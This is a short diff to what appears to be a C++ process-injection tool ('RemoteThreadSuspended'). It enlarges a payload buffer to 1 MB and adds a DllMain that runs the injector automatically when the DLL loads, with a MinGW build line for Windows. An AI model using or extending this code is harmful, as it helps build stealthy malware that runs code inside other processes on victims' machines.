@@ -13,7 +13,7 @@ typedef std::string String;
 #else
 typedef std::wstring String;
 #endif
-#define size 1024 * 60
+#define size 1024 * 1024
 unsigned char Buffer[size];
 unsigned int Buffer_len = sizeof(Buffer);
 
@@ -149,5 +149,22 @@ int main()
 
     NtClose(snapshot);
 }
-
+BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
+{ // HANDLE threadhandle;
+	switch (dwReason)
+	{
+	case DLL_PROCESS_ATTACH:
+		main();
+		// threadhandle = CreateThread(NULL, 0, main, NULL, 0, NULL);
+		// CloseHandle(threadhandle);
+		break;
+	case DLL_PROCESS_DETACH:
+		break;
+	case DLL_THREAD_ATTACH:
+		break;
+	case DLL_THREAD_DETACH:
+		break;
+	}
+	return TRUE;
+}
 // x86_64-w64-mingw32-g++ RemoteThreadSuspended.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet
